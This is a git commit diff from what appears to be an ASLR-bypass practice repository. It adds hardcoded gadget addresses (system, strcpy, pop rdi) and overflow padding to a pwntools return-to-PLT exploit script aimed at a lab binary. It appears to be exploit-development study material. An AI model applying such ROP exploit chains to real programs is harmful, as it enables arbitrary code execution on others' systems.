82a6d51d281bb267afe6d0f42df31dfa8f257e52
violet-devsec <titto.tvm@hotmail.com>
2023-03-29 01:15:04 +0530

    case3: payload updated

--- aslr-bypass/Return2plt-case-3/payload_ret2plt3.py
+++ aslr-bypass/Return2plt-case-3/payload_ret2plt3.py
@@ -1,5 +1,15 @@
 import sys
 from pwn import *
 
+s_address = 0x400476
+h_address = 0x401034
+write_to = 0x404038
+system = 0x401084
+strcpy = 0x401074
+ret = 0x40101a
+pop_rdi_ret = 0x4012c3
+pop_rsi_pop_r15_ret = 0x4012c1
+dummy = b'C' * 8
+
 buf = b'A' * 208
 buf += b'\x42' * 8
